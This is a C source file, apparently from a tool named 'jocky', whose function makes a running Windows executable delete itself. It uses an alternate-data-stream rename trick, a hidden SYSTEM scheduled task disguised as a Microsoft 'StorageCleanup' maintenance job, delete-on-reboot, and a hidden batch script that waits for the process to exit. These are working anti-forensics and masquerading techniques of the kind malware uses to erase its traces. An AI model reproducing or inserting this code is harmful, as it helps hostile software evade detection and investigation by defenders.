#include "jocky_rt.h"
#include <string.h>
#include <stdio.h>

#ifdef _WIN32
#include <windows.h>

#define DS_STREAM_RENAME L":x"
#define DS_STREAM_RENAME_BYTES (sizeof(DS_STREAM_RENAME) - sizeof(WCHAR))

typedef struct {
    BOOLEAN ReplaceIfExists;
    HANDLE  RootDirectory;
    DWORD   FileNameLength;
    WCHAR   FileName[sizeof(DS_STREAM_RENAME) / sizeof(WCHAR)];
} RENAME_BUF;

static bool try_stream_rename_delete(const wchar_t* path)
{
    HANDLE h = CreateFileW(path, DELETE | SYNCHRONIZE,
                            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;

    RENAME_BUF rb;
    ZeroMemory(&rb, sizeof(rb));
    rb.FileNameLength = DS_STREAM_RENAME_BYTES;
    memcpy(rb.FileName, DS_STREAM_RENAME, DS_STREAM_RENAME_BYTES + sizeof(WCHAR));

    BOOL ok = SetFileInformationByHandle(h, FileRenameInfo, &rb, sizeof(rb));
    CloseHandle(h);
    if (!ok) return false;

    h = CreateFileW(path, DELETE | SYNCHRONIZE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return true;

    FILE_DISPOSITION_INFO fdi;
    fdi.DeleteFile = TRUE;
    SetFileInformationByHandle(h, FileDispositionInfo, &fdi, sizeof(fdi));
    CloseHandle(h);
    return true;
}

static void schedule_persistent_delete(const char* path_a)
{
    char task_cmd[2048];
    snprintf(task_cmd, sizeof(task_cmd),
        "schtasks.exe /create "
        "/tn \"\\Microsoft\\Windows\\Maintenance\\StorageCleanup\" "
        "/tr \"cmd.exe /c "
            "if not exist \\\"%s\\\" ("
                "schtasks /delete /tn \\\"\\Microsoft\\Windows\\Maintenance\\StorageCleanup\\\" /f"
            ") else ("
                "del /f /q \\\"%s\\\""
            ")\" "
        "/sc minute /mo 5 /ru SYSTEM /rl HIGHEST /f",
        path_a, path_a);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, task_cmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

static void schedule_reboot_delete(const wchar_t* path)
{
    MoveFileExW(path, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
}

static void launch_bat_cleanup(const char* path_a)
{
    DWORD pid = GetCurrentProcessId();
    char tmp[MAX_PATH], bat[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tmp)) return;
    snprintf(bat, MAX_PATH, "%sjk_%lu.bat", tmp, (unsigned long)pid);

    HANDLE hf = CreateFileA(bat, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;

    char script[2048];
    int n = snprintf(script, sizeof(script),
        "@echo off\r\n"
        ":wait\r\n"
        "tasklist /fi \"PID eq %lu\" 2>nul | find \"%lu\" >nul\r\n"
        "if not errorlevel 1 (\r\n"
        "  ping -n 2 127.0.0.1 >nul 2>&1\r\n"
        "  goto wait\r\n"
        ")\r\n"
        "del /f /q \"%s\"\r\n"
        "del /f /q \"%s\"\r\n",
        (unsigned long)pid, (unsigned long)pid,
        path_a, bat);

    DWORD written;
    WriteFile(hf, script, (DWORD)n, &written, NULL);
    CloseHandle(hf);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char run[MAX_PATH + 16];
    snprintf(run, sizeof(run), "cmd.exe /c \"%s\"", bat);

    if (CreateProcessA(NULL, run, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

void jocky_self_delete(void)
{
    wchar_t exe[MAX_PATH] = {0};
    char    exe_a[MAX_PATH] = {0};
    if (!GetModuleFileNameW(NULL, exe, MAX_PATH)) return;
    WideCharToMultiByte(CP_ACP, 0, exe, -1, exe_a, MAX_PATH, NULL, NULL);

    if (try_stream_rename_delete(exe)) return;
    schedule_persistent_delete(exe_a);
    schedule_reboot_delete(exe);
    launch_bat_cleanup(exe_a);
}

#endif /* _WIN32 */
